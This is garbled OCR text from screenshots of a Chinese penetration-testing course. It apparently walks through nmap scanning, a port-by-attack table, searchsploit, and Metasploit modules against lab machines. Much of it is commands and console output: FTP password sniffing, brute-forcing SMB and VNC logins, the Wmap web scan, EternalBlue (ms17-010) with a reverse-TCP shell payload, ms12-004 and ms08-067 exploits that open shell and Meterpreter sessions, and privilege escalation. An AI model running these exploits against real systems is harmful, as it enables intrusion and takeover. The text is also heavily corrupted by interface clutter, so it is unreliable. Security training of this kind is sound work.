1,Metasploitable2-Linux

```
默认用户名：msfadmin
密码：msfadmin
```

2,

```
ifconfig			#查看IP

sudo su				#root
pud					#查看目录
ls					#列出文件
exit				#退出

```



+
文件（F） 编辑（E） 首页
课程安排.docx
17．Nmap基础docx
: 3e·＆导G论
三文件
插入 页面布局 引用
视图 章节 安全 开发工具 特色功能
Q查找 X■
宋体
小四
AaBbC AaBbCcDcAaBbCcD AaBbCeDd AAR册шш周周沙华田
格式期
BIU·A·XXA··A·A ··日
标题4 HTML..
普通（网站）默认股...
新样式
文档助手 文字工具·
查找醫换·选择 益
文件（F） 动作（A）
Nmap 在实际中应用场合如下：5432/tc
通过对设备或者防火墙的探测来审计它的安全性5900/tc
探测目标主机所开放的端口6000/tc
通过识别新的服务器审计网络的安全性6667/tc
探测网络上的主机 8009/tc
8180/tc
Nmap的基本操作 Nmap sc
1．对单个主机的扫描Host is
nmap <IP> Not sho
PORT
2．对多个不连续的主机进行扫描22/tcp
nmap 192.168.3.2 192.18.3.155 192.158.13.56 80/tcp
不同的IP之间用空格分开139/tcp
143/tcp
3．对连续的主机进行扫描443/tcp
445/tcp
nmap 192.168.152.100-200 5001/tc
8080/tc
4．对整个子网进行扫描8081/tc
nmap 192.168.152.1-255
Nmap 192.168.152.0/24 Nmap do
hongkea
节：1／1 设查值：22厘米
行：30■：2 一



x
-VMware Workstabion 编辑（E）
+ hongkeketang
安全 开发工具 特色功能 Q查找
已周步·＆协作 分享
·五号
AAQ安
·■A·
田 AaBbCcDd
AaBb AaBb(AaBbC BIU·A·xXA·■·A·A
正文 标题1 标题2 标题3 新样式
文格助手 文字工具·
查找醫换·选择 回收站
Nmap端口扫描 文件系统
什么是端口？
端口是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虎把端口江
0B
五号
-AA
机内部的端口，不可见。例如计算机中的80端口、21端口、23端口等。物xBIUA·Kali Linux
口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。amd641
端口对应着服务和软件端口范围：0～65535
常见的端口及其说明，以及攻击方向汇总如下文件共享服务端口
端口号
端口说明
攻击方向 Ftp／Tftp 文件传输协议
允许匿名的上传，下载，爆破，嗅探操作页■1
6：5 列：38
拼写检查
文档校对 汉祥云4



x
VMware Workstation
编辑（E）
+
hongkeketang
开始
摄入
页面布局
安全
开发工具
特色功能
表格工具
表格样式
Q查找
已间步·＆协作 分享
思源黑体
10
AAQ安
田文閏閏·
AaBbCcDd
AaBb AaBb( AaBbC
AA
B
IU·A·XXA·■·A·A
正文
标题1
标题2
标题3
新样式
文格助手
文字工具
查找？换·选择
·
特殊服务端口
回收站
端口
端口说明
攻击方向
文件系统
2181
Zookeeper 服务
未授权访问
8069
Zabbix 服务
远程执行，SQL注入
Kali Linux
amd641
9200/9300
Elasticsearch 服务
远程执行
11211
Memcache 服务
未授权访问
512/513/514
Linux Rexec 服务
爆破，Rlogin登录
873
Rsync 服务
匿名访问，文件上传
3690
Svn 服务
Svn 泄露，未授权访问
页■：3／4
字数：872
拼写检查
文档校对
9월 1



hongkeketang-VMware Workstation
文件 编辑（E）
森页
18.Nmap调口扫描.docx
shigua
C hongkeketand
三文件、
开始
城
页面布周
引用
窗风
复节
安全
开发工具
特色功能
表格工具
表格样式
Q查线
Q已同步·凸能作 凸分享
×爱切
思浮里体
10
AA6
雪
E·E·ΞA··E
AaBbCcDd
AaBbAaBb(AaBbC
AA
粘贴·□复则 格式期
BIU-A-XX: A·-Δ·A
門
벌抜·8·田
正文
标题1
标赖 2
新样式”
文档助手 文字工具·
查找替换·选择
回收站
2181
Zookeeper 服务
未授权访问
文件系统
8069
Zabbix服务
远程执行，SQL 注入
9200/9300
Elasticsearch 服务
远程执行
主文件夹
11211
Memcache服务
未授权访问
Kali Linux
amd641
512/513/514
Linux Rexec 服务
873
Rsync服务
爆破，Rlogin 登录
匿名访问，文件上传
3690
Svn 服务
Svn 泄露，未授权访问
50000
SAP Management Console
远程执行
实验靶机：Metasploitable2 IP:192.168.152.129
贾际3 页墨：3/4 节：1/1 设置请：21.8厘米
示 1 段 6
字数：872 国拼写检查 国文档经对
170%
OBS 25.0.8 (64-b
hongkeketang--
18.Nmap第口扫



bongkeketang-VMware Workstation 文件（F）
编辑（E）
首页
22．？岡分析工具legion数程doox
x
23．開洞利用searchsploit．docx hongkeketang
开发工具
特色功能
Q查找
··
尔勺描由，出国 三 文件
插入
页面布局 X■
宋体（正文）
·五号
AaBbCcDd
AaBb AaBb( AaBbC 格式期
BIU·A
标题2
标■3
新样式
文格助手 文字工具
查找替换·造择 文件（F）
动作（A） mapExporter.py
0/20 140010030
2006301653418129
1,30AB
AmeL {"time":*2020-8
4
sRep ository',*filen
惟 {"time":
2020-0 sRepository.py Process Processi Processi Processi Process1
Processi
{"time":2020-0 a":{*logger_nam
扫描完毕后，切换左侧Hosts、Services、Tools栏可查看主机、系统信息，服务2020-
{*time":
2020- {"time":
·2020-6
信息以及工具扫描结果的列表。["time":
2020-0 {"time*:
2020-0
79}} ["time":
2020-0 "time":
2020-0 ("time":
2020-0
Help
*2020-
"time":
2020 2020
Scan
Brute Hosts
Services
Tools
Services
88 写检查
［文■校对 

ongkeketang-VMware Workstation
X 偏■（E）
ongkeketang
插入
安全 开发工具 特色功能 Q查找
E特·学 L论 文閏閏·出
田 AaBbCcDd
AaBb AaBb( AaBbCi I U·A·XXA·■·
标■1 标■2 标题3
文档助手 文字工具·
查找替换·选择 回收站
漏洞利用 文件系统
https://www.exploit-db.com 主文件夹
利用本地漏洞资源 Kali Linux
amd641
kali Linux系统中，有搜索漏洞数据库（exploitdb）的本地副本，我们可以在终端窗口中输入命令去搜索。
I Searchsploit
参数
—c，—case［Term］执行区分大小写的搜索，默认搜索对大小写不敏感。-e，--exact［Term］对exploit 标题执行EXACT匹配（默认为AND） -j，--json［Term］以JSON格式显示结果
88 拼写检查 文档校对
帽口 

hongkeketang-VMware Workstation
文件（F） 编辑（E） 查看（V）
违项卡（T） 帮助（H）
Shell No.1 文件（F）
动作（A）
编辑（E）查看（V）
帮助（H） er
msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > show options Module options (auxiliary/scanner/portscan/tcp): Name
Current Setting
Required
Description CONCURRENCY
10
yes
The number of concurrent ports to check per host DELAY
0
yes
The delay between connections, per thread, in milliseconds JITTER
0
yes
The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
PORTS
1-10000
yes
Ports to scan (e.g. 22-25,80,110-900) RHOSTS
yes
The target host(s), range CIDR identifier, or hosts file with syn tax 'file:<path>'
THREADS
1
yes
The number of concurrent threads (max one per host) TIMEOUT
1000
yes
The socket connect timeout in milliseconds msf5 auxiliary(scanner/portscan/tcp) > set rhosts 192.168.152.129
rhosts  192.168.152.129
I msf5 auxiliary(scanner/portscan/tcp)



hongkeketang-VMware Workstation
文件（F） 编辑（E）
选项卡（T） 帮助（H） Shell No.1
11：24上午 Shell No.1
文件（F）动作（A）編辑（E）查看（V）
帮助（H） TIMEOUT
1000
yes
The socket connect timeout in milliseconds msf5 auxiliary(scanner/portscan/tcp)> set rhosts 192.168.152.129
rhosts192.168.152.129
msf5 auxiliary(scanner/portscan/tcp) > show options Module options (auxiliary/scanner/portscan/tcp): Name
Current Setting
Required
Description CONCURRENCY
10
yes
The number of concurrent ports to check per host DELAY
0
yes
The delay between connections, per thread, in milliseconds JITTER
0
yes
The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
PORTS
1-10000
yes
Ports to scan (e.g. 22-25,80,110-900) RHOSTS
192.168.152.129
yes
The target host(s), range CIDR identifier, or hosts file with syn tax 'file:<path>'
THREADS
1
yes
The number of concurrent threads (max one per host) TIMEOUT
1000
yes
The socket connect timeout in milliseconds msf5 auxiliary(scanner/portscan/tcp) > set threads 10
threads→10
msf5 auxiliary(scanner/portscan/tcp)> show 

□
x O x
首页
■亮模板
课程安推.docx
+
✓: E·＆ẵ D论
插入
开发工具 特色功能
Q■找 田
11
AaBbC AaBbCeDc AaBbCcD
AaBbCcDd 标题4
HTML 普通（网站） 默认段... 新样式
文極助手 文字工具·
查找醫换·选择· Metasploit：网络嗅探，获取FTP密码
实验环境
模拟用户：windows7
实验靶机：Windows server 2008（带有FTP服务）IP：192.168.152.135
I 切换管理员
ns opns
启动 metasploit
输入命令 msfconsole 启动 metasploit
root@kali:/home/kali# msfconsole 使用密码嗅探模块
页■：1／1
字数：96
拼写检查 1/L
一■
教程编辑：管子 

□
x x
+ 核売模板
课程安排.docx
28．Metasploit：FTP密码．docxX 証種
✓ E国·印5 L论
插入 页面布局 引用 审间
堂节 安全 开发工具 特色功能
Q查找 -小四
AA
三·三·豆A·外·田
AaBbCAaBbCcDc AaBbCcD AaBbCcDd
AA
*
0 U·A·XXA·■·A·A
标题4 HTML
普通（网站）默认段..
新样式
文档助手 文字工具·
查找醫換·选择·
··
文
实验机：wvinuows server 2000服：192.108152135 切换管理员
sudo su
启动 metasploit
输入命令 msfconsole 启动 metasploit
root@kali:/home/kali# msfconsole 使用密码嗅探模块
use auxiliary/sniffer/psnuffle +
该模块可以不设置如何参数，即可使用
执行命令：run 开始嗅探
M
github.com/rapid7/
metasp nodules
converted
to just report credentials without report_auth_info,se m
5:1/1
设查值：14.5厘米
字数：96
文档校对
170%-- 202
S■一成
ш＠铁
教程编辑：管子 

+
hongkeketang
插入
开发工具 特色功能 Q查线
Q已同步·＆协作分享
·· 四号
周周
AaBbCcDd
AaBb AaBbC AaBbC A
正文 标题1 标题2 标■3
文档助手 文字工具·
登找？换·选择· x
8 回收站
Metasploit：SNMP扫描与枚举 文件系统
什么是SNMP
SNMP 是专门设计用于在IP网络管理网络节点（服务器，工作站，路由器，交换机等）的一种标准协议，它是一种应用层协议。
各种网络设备上都可以看到默认启用的SNMP服务，从交换机到路由器，从防火墙到网Kali Linux
络打印机，无一例外。amd641
实验靶机：Metasploitable2 IP：192.168.152.137
默认情况下，Metasploitable的SNMP服务仅侦听本地主机。 打开并编辑“／etc／default／snmpd”，然后将以下内容更改为：
I SNMPDOPTS='-Lsd-Lf/dev/null-u snmp-l-smux-p/var/run/snmpd.pid 127.0.0.1'
修改为
SNMPDOPTS='-Lsd-Lf/dev/null-u snmp-l-smux-p/var/run/snmpd.pid 0.0.0.0' SNMP 扫描
msf5 use auxil
/scanner/snmp/snmp_login msf5
auxiliary(scanner/snmp/smmp_togin)> show options
？08目2の2 行：17列：7
字龄：194 拼写检查 文档校对
教程编辑：管子 

30．Metasploit：扫■密码主机
x +
:
勺由，生贯 hongkeketam
开始 插入 页面布局
安全 开发工具 特色功能
Q直找 Calibri（正文）
·五号
AA安·日·日·理·
AaBbCcDd
AaBb AaBbC AaBbCi U-A·xxA·■·A·A
正文 标题1 标？2 标盟3 新样式
文档勘手 文字工具·
查找醫换·选择 回收站
Metasploit：扫描弱密码主机 文件系统
实验靶机：多台 windows
I
使用到的模块
auxiliary/scanner/smb/smb_login Kali Linux
amd641
操作过程
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login)>show options Module options (auxiliary/scanner/smb/smb_login): Name
Current Setting
Required
Descripti ABORT_ON_LOCKOUT
false
yes
Abort the BLANK_PASSWORDS
false
no
Try blank BRUTEFORCE_SPEED
5
yes
How fast false
Try each
88 ou
行：3■：15
字数：28拼写检查
文档校对
170%·- 采国目フの
教程编辑：管子
き



+
X
30．Metasploit：扫密码主机 hongkeketan
开始 插入
开发工具 特色功能 Q直找
E国·＆Dú
: Calibri（正文）
·五号
田·品閉閏出，我이ェ
AaBbCcDd
AaBb AaBbC AaBbC U·A·XxA·■·A·A
正文 标题1 标？2 标盟3 新样式
文福勘手 文字工具·
查找？换·选择 回收站
Metasploit：扫描弱密码主机 文件系统
国
实验靶机：多台windows 使用到的模块
auxiliary/scanner/smb/smb_login
I Kali Linux
amd641
操作过程
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login)>show options Module options (auxiliary/scanner/smb/smb_login): Name
Current Setting
Required
Descripti ABORT_ON_LOCKOUT
false
yes
Abort the BLANK_PASSWORDS
false
no
Try blank BRUTEFORCE_SPEED
5
yes
How fast false
Try each
88 ou
行3■：15
字数：28 拼写检查
文档校对
170%·- 0目目2の公
教程编辑：管子
4学



开发工具
特色功能 Q意找
已国步·＆协作分享 五号
····
AaBbCcDd
AaBb AaBbC AaBbC 理师品画低猫
正文 标题1 标题2 标题3 新样式
文極助手 文字工具
查找替换·选择· 回收站
Metasploit：VNC身份识别 文件系统
什么是VNC？
VNC（Virtual Network Console）是虚拟网络控制台的缩写。它是一款优秀的远程控制工具软件。主文件夹
VNC 是在基于UNIX和Linux操作系统的免费的开源软件，远程控制能力强大，高效实用，其性能可以和 Windows 和MAC中的任何远程控制软件媲美。在Linux中，VNC包括以
下四个命令：vncserver，vncviewer，vncpasswd，和vncconnect。大多数情况下用户只需要 Kali Linux
amd641
其中的两个命令：vncserver 和 vncviewer。
实验靶机：Metasploitable2-Linux IP：192.168.152.137 VNC无身份验证扫描
msf5 > use auxiliary/scanner/vnc/vnc_none_auth
msf5 auxiliary(scanner/vnc/vnc_none_auth)> show options Module options (auxiliary/scanner/vnc/vnc_none_auth):
Current Setting
Required
Description 拼写检查
文科校对 

编辑（E）
■壳模板
31．Metasploit：VNC身份识胞．docxX
+ hongkeketang
开始
页面布局 引用
审间 视图
章节 安全 开发工具
特色功能 Q
掌控安全CTF交流群 ［4条］ lōvé裴ぺ： 有人带节奏插入
五号
·AAю■mm·岛周2业·田AaBbCcDd
AaBb AaBbC AaBbC
AA
4
0 文件（F）
动作（A）
BIU·A·XXA·■·A·A
正文
标？2 标？3新样式·文档助字 文字工具
壹找醫換·法律
·
必■一
The target host(s), range CIDR identifier, or hosts fi RHOSTS
yes ile:<path>'
RPORT
5900
yes
The target port (TCP) msf5 >
THREADS
1
yes
The number of concurrent threads (max one per host) msf5 >
msf5 auxiliary(scanner/vnc/vnc_none_auth)>set rhosts 192.168.152.130 msf5
au
rhosts192.168.152.130
msf5 auxiliary(scanner/vnc/vnc_none_auth)>run Module
192.168.152.130:5900
- 192.168.152.130:5900 - VNC server protocol version: [3,4].3 [+]
[*]
192.168.152.130:5900-192.168.152.130:5900- VNC server security types supported: VNC Name
192.168.152.130:5900 - Scanned 1 of 1 hosts (100% complete) :
Auxiliary module execution completed msf5 auxiliary(ae/un/c
QB·
·五号
A RHOS
x白BIU·A· ile:<pa
VNC密码爆破 RPOR
THRE
auxiliary/scanner/vnc/vnc_login msf5 au
rhosts
msf5 auxiliary(scannor/vnc/vnc_login)>set rhosts 192.168.152.130 msf5
au
rhosts192.168.152.130
msf5 auxiliary(scanner/vnc/vnc_login)> show options 192
Module options (auxiliary/scanner/vnc/vnc_login): [+]
192
[*]
Current Setting
[*]
192
BLANK_PASSWORDS
[*]
Aux msf5 au
页码1 页面1／3 节：1／1 设置值：17.8厘米
字数：5／172
拼写检查
文档校对 hongkeketang·.
31.Metasploit: 

口
编辑（E）
秘売模板
31．Metasploit：VNC身份识■．docxX F
+ hongkeketang
开始 插入 页面布局 引用
视图 章节 安全 开发工具 特色功能 Q意找
Eu·83 0论 五号
·AAQ安·E·E·A··
AaBbCcDd
AaBb AaBbC AaBbC
· 文件（F）
动作（A）
格式期
BIU·A·XXA·■·A·A
正文 标■1 标■2 标题3 新样式 文杨助手
文字工具
·田·
STOP
line
ing when a
USER_AS_PASS
false USER_FILE
THRE
VERBOSE
true
of concur
USER
msf5 auxiliary(scanner/vnc/vnc_login)> set threads 10
sn threads 10
ername
msf5 auxiliary(scannex/vnc/vnc_login)>run USER
ini 192.168.152.130:5900
- 192.168.152.130:5900-ptarting VNC togin sweep
[*]
ng user
[+] 192.168.152.130:5900 - 192.168.152.130:5900-
Login Successful: :password USER
*]
192.168.152.130:5900- Scanned 1 of 1 hosts (10v% complete)
ern
[*]
Auxiliary module execution completed ame as
msf5 auxiliary(scanner/vnc/vnc_login)>| USER
ini 0B
·五号
A ng user
X凸BIUA· VERB
VNC登陆
Jd int out
msf5 au
kaliakali:~$ vncviewer 192.168.152.130 rhosts
Connected to RFB server, using protocol version 3.3 msf5
au
Performing standard VNC authentication Password:
192
[*]
[+] 192
[*] 192 Aux
TightVNC:root's X desktop (metasploitable:0)
[*]
88 msf5 au
页码：2 页面：2／3 节：1／1 设置值：15.7厘米

■壳模板
32 Metaspl．．．Wmap网站
安全 开发工具 特色功能 Q查找
已岡步·＆协作分享 五号
田···
AaBbCcDd
AaBb AaBb(AaBbC
· 正文
标题1 标■2 标题3 新样式
文州助手 文字工具 回收站
Metasploit：Wmap 网站漏洞扫描 文件系统
Wmap 本身不是一个独立的漏洞扫描器，而是作为Metasploit的一个模块，结合Web漏洞
和Web服务相关的模块协同工作，完成目标服务器的扫描任务。它的扫描结果不会自动生主文件夹
成报告，而是直接存入Metasploit的数据库。Kali Linux
加载 wmap
I amd641
Load wmap
向Wmap 中添加一个扫描站点
msf>wmap_sites-a http://192.168.152.137/mutillidae/ 查看已添加的站点
msf>wmap_sites-l
根据已添加站点的ID，设置带扫描的目标站点msf>wmap_targets-d 0
检查已待扫描的目标主机msf>wmap_targets-l 执行测试
字数：200拼写检查
文档校对 

编辑（E）
■页 税売模板
32．Metaspl．Wmap网站周周扫描
+ hongkeketang
页面布局
引用审阅视图 章节
安全 开发工具 特色功能 Q查找
Eu·ẵG论 Calibri（正文）
生苏
·五号
AaBbCcDd
AaBb AaBb(AaBbCi
AA 动作（A）
BIU·A·XxA··A·A··
AAR■m·ш·園周书沙出·
标题1
查找替换·选择· 正文
标题2 标题3 新样式
文細助手 文字工具
工日7
的扫江。 +
成报告，而是直接存入Metasploit的数据库。+
Metaspl
加载 wmap
Load wmap msf5 >
向Wmap 中添加一个扫描站点
msf>wmap_sites -a http://192.168.152.137/mutillidae/ 查看已添加的站点
msf> wmap_sites -I [WMAP 1
根据已添加站点的ID，设置带扫描的目标站点
[*] Suc
msf>wmap_targets-d 0 msf5 >
[*] Sit
检查已待扫描的目标主机msf5 >
msf>wmap_targets -l
[*]Ava
执行测试
msf>wmap_run-e Id
扫描完成后，使用Metasploit命令检查漏洞记录msf>vulns
0
msf>wmap_vulns-l msf5
页：1 页面：1／1
节：1／1 设置值：10.6厘米

编辑（E）
首页
秘売模板
32．Metaspl．．Wmap网站？扫描
+ hongkeketang
H苏
页面布局
引用 审阅 视图 章节
安全 开发工具 特色功能 Q意找
已同步·＆协作分享 Calibri（正文）
·五号
AaBbCcDd
AaBb AaBb(AaBbC 田·公交閏出·出，文
动作（A）
B IU·A·XxA··A·A·日
正文 标题1 标■2 标题3 新样式 文档助手 文字工具
查找■换·选择 Suc
msf>wmap_sites-a http://192.168.152.137/mutillidae/
[*]
msf5 >
查看已添加的站点
[*] Sit
msf>wmap_sites-I msf5 >
根据已添加站点的ID，设置带扫描的目标站点
[*] Ava
msf>wmap_targets-d 0
检查已待扫描的目标主机Id
msf>wmap_targets -l -
执行测试 0
msf>wmap_run-e
扫描完成后，使用Metasploit 命令检查漏洞记录msf5 >
msf>vulns
[*] Loa
msf>wmap_vulns-I msf5 >
[*] Def
Id
0 msf5 >
页码：1 页面：1／1
：1／1 设置值：12.8厘米

ketang
安全 开发工具 特色功能 Q查找
已同步·＆协作分享
: Calibri（正文）
·报 田 AaBbCcDd
AaBb AaBbC AaBbC 正文
标题1 标■2 标题3 新样式
文档助手 文字工具
查找慧换 回收站
Metasploit远程代码执行 文件系统
什么是远程代码执行？
I 实验靶机：Windows server 2008 IP： 192.168.152.135 server 2008 远程代码执行
Kali Linux amd641
msf5 > search ms17-010 Matching Modules
# Name
Disclosure Da scription
88 0 auxiliary/admin/smb/ms17 010_command
2017-03-14 节：1／1 设查值：5.7厘米 行：5■44
字龄：72 拼写检查 文档校对
2m目
200% 

Shell No.1
文件（F）动作（A） 编辑（E） 查看（V） 帮助（H）
+ -- --=[ 562 payloads - 45 encoders - 10 nops + -- --=[ 7 evasion
Metasploit tip:Open an interactive
复选区（S）
Ctrl+Shift+C 粘贴剪切板内容（B）
Ctrl+Shift+V msf5 > search ms17-010
粘贴选区（E）
Shift+Ins 缩小（1）
Ctrl++ Matching Modules
放大（O）
Ctrl+- 重置大小（）
Ctrl+0 Name
清空活动终端（C）
Ctrl+Shift+X
closure Date
Rank
Check
Description #
水平布局终端（H）
---- ----
一
垂直布局终端（V） 0
auxiliary/admin/smb/ms17_010_c
折叠布局子终端（C）
7-03-14
normal
No
MS17-010 EternalRomance/EternalSynergy /EternalChampion SMB Remote Windows
1 auxiliary/scanner/smb/smb_ms17.
下拉菜单（
Ctrl+Shift+M
normal
No
MS17-010 SMB RCE Detection 2
参数配置（P）...
2017-03-14
average
Yes
MS17-010 EternalBlue SMB Remote Window exploit/windows/smb/ms17_010_etcrnacocue
s Kernel Pool Corruption
3 exploit/windows/smb/ms17_010_eternalblue_win8
2017-03-14
average
No
MS17-010
EternalBlue SMB Remote Window s Kernel Pool Corruption for Win8+
4 exploit/windows/smb/ms17_010_psexec
2017-03-14
normal
Yes
MS17-010
EternalRomance/EternalSynergy /EternalChampion SMB Remote Windows Code Execution
5 exploit/windows/smb/smb_doublepulsar_rce
2017-04-14
great
Yes
SMB DOUBLEPULSAR Remote Code Execution msf5



個页
杨壳橋板
33．Metasploit程代码执行．docx
x
+ ketang
三文件
引用 审间
视图 章节 安全 开发工具 特色功能 Q查找
E导·＆ D出
✓ AA0■，mm周周沙作田
X■切
Calibri（正文）
·五号
AaBbCcDd
AaBb AaBbC AaBbC 动作
B
U-A·xxA·■·A·A
正文 标■1 标■2 标题3 新样式
文極助手 文字工具·
查找？换·选择·
·
SMBU
3
exploit/windows/smb/ms17_010_eternalblue
2017-03-14 VERI
17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption VERI
4
exploit/windows/smb/ms17_010_eternalblue_win8
2017-03-14 Payload
use exploit/windows/smb/ms17_010_eternalblue
A Name
·Calibri（正文）·五号 set rhosts 192.168.152.157
み凸BIUA· EXIT
set payload windows/x64/shell/reverse_tcp LHOS
set lhost 192.168.152.148 LPOF
LURI
run
192.168.152.157:445 - ETERNALBLUE overwite compteted successrutty 192.168.152.157:445-Sending egg to corrupted connection.
Exploit
192.168.152.157:445-Triggering free of corrupted buffer. Sending stage (336 bytes) to 192.168.152.157
Id
Command shell session 1 opened (192.168.152.148:4444→192.168.15 20-05-19 22:53:40 -0400
0
[+]
192.168.152.157:445- [+]
192.168.152.157:445-=
-WIN-: [+]
192.168.152.157:445-=-
88 msf5 ex
页■：1／2 〒:1/1
设置值：18.4厘米
行：11 列：43
字数：3／72 拼写检查 文档校对
■■目目2必 rhosts
一■■
msf5 exploit(windows/smb/ms17_010_eternalblue) 

□
首页
临壳模板
33．Metasploit程代码执行．docx
+
x eketang
页面布局
引用审间
视图 章节 安全 开发工具 特色功能 Q查找
已同步·＆协作 分享
✓ Calibri（正文）
·五号
母·报品閏出·文、
AaBbCcDd
AaBb AaBbC AaBbC 文件（F）
动作
B
IU·A·xxA·■·A·A
正文 标题1 标■2 标题3
文極助手 文字工具
壹找醫換·选择·
[*]
世 192
3
exploit/windows/smb/ms17_010_eternalblue
2017-03-14 [+]
192
17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption (64-bj
192
4
exploit/windows/smb/ms17_010_eternalblue_win8
2017-03-14
[*]
[*]
192 [+] 192 [+] 192
use exploit/windows/smb/ms17_010_eternalblue
[*]
192 192
set rhosts 192.168.152.157
[*]
[*] 192
set payload windows/x64/shell/reverse_tcp|
[*]
192
set lhost 192.168.152.148
[*]
192 [+] 192
run
[*]
192
192.168.152.157.445 - ETERNALBLUE overwite compteted successrutty 192
192.168.152.157:445-Sending egg to corrupted connection.
[*]
192
192.168.152.157:445-Triggering free of corrupted buffer.
[*]
[+] 192
Sending stage (336 bytes) to 192.168.152.157 [+]
192
Command shell session 1 opened (192.168.152.148:4444→192.168.15
[*]
192
20-05-19 22:53:40 -0400
*]
192
[+]
192.168.152.157:445- 192
192.168.152.157:445-=
-WIN- 192
[+]
192.168.152.157:445- 192
88 1921 页■：1／2 节：1／1 设置语：18.4厘米 行：11 列：42
字裁：72 算屬检章 文档校对
東中目目2の必 

开发工具
特色功能 Q查找
已岡步·＆协作 分享
: 出·1
AaBbCcDd
AaBb AaBbC AaBbC 正文
标■1 标■2 标题3 新样式
文档助手 文字工具
查找醫换·选择 回收站
利用浏览器漏洞，远程执行代码文件系统
实验靶机：Windows xp
IP:192.168.152.140 漏洞利用
ms12-004
I Kali Linux
amd641
msf5 > search ms12-004 Matching Modules
#
Name
Disclosure D -
0
exploit/windows/browser/ms12_004_midi
2012-01-10
88 tPolvEvent Hean Overflow
节：1／1 设查值：5.7厘米 行：5列：9 字数：44 拼写检查 文档校对
2目2の 

Shell No.1
Shell No.1 文件（F）
动作（A）编辑（E）
查看（V）
帮助（H） Shell No.1
hongke@kall:- /manage/priv_migrate' 吕
SESSION may not be compatible with this module.
Post failed: NoMethodError undefined method 'sys' for #<Msf:: Sessions :: CommandShellWindows:0x00007fb10959 4d60>
Call stack: 奠
/usr/share/metasploit-framework/modules/post/windows/manage/priv_migrate.rb:44:in `run' msf5 exploit(windows/browser/ms12_004_midi)> sessions
Active sessions
Name
Type
Information PI
Connection --
1
shell x86/windows
Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Cor. ..
192.168.152.128:6666 → 192.168.152.140:1036 (192.168.152.140) msf5 exploit(windows/browser/ms12_004_midi)> sessions -i 1
[*] Starting interaction with 1...
I 

XP Professional-VMware Workstation
首页
板売模板
35.Metasploit:.docx
36．Metasploit．etasploit生成后门
37．Metasploit：生成Android■门 hangkeketang
三文件
开发工具
特色功能
Q查找
已间步·＆协作分享
:
··
AaBbC AaBbCcDc
AaBbCcD AaBbCeDd 延庆
B
标？4 HTML..
普通（网站） 默认段...
新样式
文極助手 文字工具
查找慧换·选择 Metasploit：漏洞提权
实验靶机：IWindows xp IP地址：192.168.152.140 提权的条件，必须先有一个会话
Windows xp
提权
esf5>use exploit/windows/smb/ms08_067_netapi
asf5 exploit(indows/smh/ms_67_tap)>show options Module options(exploit/windows/smb/ms08_067_netapi): Name
Current Setting Required Description （大））
（大） C00
RHOSTS
yes
The target host(s),range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT
445
yes
The SMB service port (TCP) SMBPIPE
BROWSER
yes
The pipe name to use (BROWSER,SRVSVC) Exploit target:
Id Name 一
00 0
Automatic Targeting
88 2目2の心
页码：1 页面：1／3
行：6 列：43
字数：42 拼写检查 文档校对
242PM start



s XP Prolessional-VMware Workstation
首页
临売模板
37．Metasploit：生成Android后门 hangkeketang
三文件
开发工具
特色功能
Q查找
已同步·＆协作 分享
: X■切
宋体（正文）
A·外·田
AaBbC AaBbCcDc
AaBbCcD
AaBbCcDd HTML...
普通（网站） 默认段.
世
文档助手 文字工具—
壹找替换·选择 Metasploit：漏洞提权
00
宋体（正文）-11
AA 实验靶机：Windows xp IP地x
A
BIU·A·E·· 提权的条件，必须先有一个会话
Windows xp
提权
esfs >use exploit/windows/smb/ms08_067_netapi
asf5 exploit(windos/sh/_e67.eetapi)>show options Module options(exploit/windows/smb/ms88_067_netapi): Nane
Current Setting
Required Description C
000d0ncoo C00o
RHOSTS
yes
The target host(s),range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT
445
yes
The SMB service port (TCP) SMBPIPE
BROWSER
yes
The pipe name to use (BROWSER, SRVSVC) Exploit target:
Id Name
0000
Automatic Targeting
88 页码：1 页面：1／3 节：1／1 设置值：4.6厘米
行：3■14
字龄：13／42拼检查 文档校对
2m目目 Hstart
2.42PM 

hongkeketang·VMware Workstation
?(H)
Shell No.1 文件（F）
动作（A） 编辑（E）
查看（V）帮助（H）NMMMMMMMMMMMMO
+#++:++#+ ' oOWMMMMMMMMo
+:+ .,cdkOOK;
:+:
:+: :+:
Metasploit
=[ metasploit v5.0.93-dev
+ -- --=[ 2029 exploits - 1103 auxiliary- 344 post + -- --=[ 562 payloads - 45 encoders - 10 nops + -- --=[ 7 evasion
Metasploit tip: Enable verbose logging with set VERBOSE true msf5>search ms08-067
Matching Modules #
Name
Disclosure Date
Rank
Check
Description -
---- 0
exploit/windows/smb/ms08_067_netapi
2008-10-28
great
Yes
MS08-067 Microsoft Server Service Relative Path S tack Corruption
msf5 

eketang-VMware Workstation
编辑（E）
x 首页
临売模板
35．Metasploit：漏．docx
x
36．Metasploit．．etasploit生成后门
37．Metasploit：生成Android后门 hongkeketang
三文件
开始
页面布局
引用
章节 安全
开发工具
特色功能
Q查找
✓: 日
X■切
宋体
·四号
-AAQ
E·A··田
AaBbCcDd
AaBb AaBbC AaBbC
·
文件（F） 动作
格式期 B
IU-A·XXA·■·A·A
正文 标■1 标■2 标题3
文档助手 文字工具
查找醫換·选择· Exploit target:
世 LPOR
Id Name
Automatic Targeting Exploit
asf5 exploit(windows/smb/m_067_metapi)>run
[*] Started reverse TCP handler on 192.168.152.148:5555 PI
[]192.168.152.158:445-Automatically detecting the target... 0
[*]192.168.152.158:445-Attempting to trigger the vulnerability...
[*]
Sending stage (180291 bytes) to 192.168.152.158
[*] Meterpreter session 1 opened (192.168.152.148:5555→ 192.168.152.158:1040)at 2020-05-24 22:45:37 -0400 neterpreter>
msf5 ex rhosts msf5 ex lport
meterpreter > background msf5 ex
[*]
Backgrounding session 1...
[*]
Sta 192
[*]
[*]192
msf5 exploit(windows/smb/ms08_067_netapi)>search 14-002
[*]192
192
Matching Modules
[*]
Ser
======
88 Met
行：5■14
字数：42 拼写检查 文程校对meterpreter
一■■ 

hongkeketang-VMware Workstation
文件F
选项卡①
全
